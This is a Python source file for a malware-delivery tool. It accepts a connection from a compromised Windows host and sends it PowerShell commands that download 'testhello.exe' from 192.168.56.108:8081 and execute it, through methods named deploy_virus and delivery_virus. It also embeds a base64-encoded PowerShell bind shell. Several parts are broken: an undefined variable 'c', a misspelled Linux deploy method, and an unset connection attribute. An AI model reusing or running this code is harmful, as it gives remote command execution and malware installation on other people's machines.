import socket, threading
import time
from replicate import replicate


class tunnel(threading.Thread):
    
    def __init__(self, lhost="0.0.0.0", lport=1337):
        self.lhost = lhost
        self.lport = lport
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.sock.bind((self.lhost,self.lport))
        self.sock.listen(5)
        print("Establishing Tunnel - listening on port {}".format(self.lport))
        self.connection = {}
        super().__init__()
    
    
    def run(self):
        print("accepting traffic on port {}".format(self.lport))
        conn, addr = self.sock.accept()
        conn.settimeout(5.0)
        self.set_connection(conn,addr)
        print("Got a connection from: {}",addr)
        self.deploy_virus(replicate("container/testhello.exe"))
    
    
    def sent_command(self, command):
        print(command)
        self.conn.send(command)
        time.sleep(1)
        
    def get_response(self):
        response = self.conn.recv(1024).decode()
        return response
    
    def delivery_virus(self, target_ip, virus):
        self.get_connection(target_ip).sendall(virus)


    def generate_base64_bind_shell_code(self, ostype:str):
        if ostype == "windows":
            bind_shell = ""
            bind_shell += "JABsAGkAcwB0AGUAbgBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBr"
            bind_shell += "AGUAdABzAC4AVABjAHAATABpAHMAdABlAG4AZQByACgAIgAwAC4AMAAuADAALgAwACIALAA3ADcANwA3ACkAOwAkAGwAaQBzAHQA"
            bind_shell += "ZQBuAGUAcgAuAHMAdABhAHIAdAAoACkAOwAkAGMAbABpAGUAbgB0ACAAPQAgACQAbABpAHMAdABlAG4AZQByAC4AQQBjAGMAZQBw"
            bind_shell += "AHQAVABjAHAAQwBsAGkAZQBuAHQAKAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIA"
            bind_shell += "ZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3"
            bind_shell += "AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIA"
            bind_shell += "eQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBq"
            bind_shell += "AGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkA"
            bind_shell += "bgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAg"
            bind_shell += "AD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4A"
            bind_shell += "ZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0"
            bind_shell += "AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0A"
            bind_shell += "OgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAu"
            bind_shell += "AFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQA"
            bind_shell += "cwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA7ACQAbABpAHMAdABl"
            bind_shell += "AG4AZQByAC4AUwB0AG8AcAAoACkA"
            return bind_shell
        elif ostype == "linux":
            return ""
        else:
            return ""
        
    def deploy_virus(self, data, ostype="windows"):
        serversocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = "0.0.0.0"
        port = 8081
        serversocket.bind((host,port))
        serversocket.listen(5)
        print("Deployment Server listening on port", port)
        
        if ostype=="windows":
            self.depoly_to_windows()
        else:
            self.deploy_to_linux()
        
        clientsocket,addr = serversocket.accept()
        print("Got a connection from", addr)
        try:
            binary_content = data.read()
            chunk_size = 1024
            for i in range(0, len(binary_content), chunk_size):
                clientsocket.sendall(binary_content[i:i+chunk_size])
        except FileNotFoundError:
            clientsocket.sendall(b'File not found')
        except Exception:
            print("error on deploy:")
        clientsocket.close()
        serversocket.close()
     
            
    def depoly_to_windows(self):
        #start command sequence
        try:
            start = input("press enter to start")
            command = "cd \\users".encode()
            command+=b"\n"
            c.sent_command(command)
            print("change to users directory")
            print(c.get_response())
            command = "powershell".encode()
            command+=b"\n"
            c.sent_command(command)
            print("run powershell")
            print(c.get_response())
            command = '$client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.56.108", 8081); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $receivedBytes = 0; $totalBytes = 0; $file = New-Object System.IO.FileStream("testhello.exe", [System.IO.FileMode]::Create); do { $receivedBytes = $stream.Read($buffer, 0, 1024); $totalBytes += $receivedBytes; $file.Write($buffer, 0, $receivedBytes); } while ($receivedBytes -ne 0); $file.Close(); $client.Close();'.encode()
            command+=b"\n"
            c.sent_command(command)
            print("target machine is starting to connect to the us")
            print(c.get_response())
            time.sleep(3)
            command = "./testhello.exe".encode()
            command+=b"\n"
            c.sent_command(command)
            print(c.get_response())
        except TimeoutError as t:
            print("no Response")
            
            
    def depoly_to_linux(self):
        pass        
    
    
    def set_connection(self, conn, addr):
        self.connection[addr] = conn


    def get_connection(self, target_ip):
        if target_ip in self.connection:
            return self.connection[target_ip]
        else:
            print("target connection does not exists {}".format(target_ip))
            return None


    def set_close_client_connection(self,client_ip):
        conn = self.get_connection(client_ip)
        if conn != None:
            conn.close()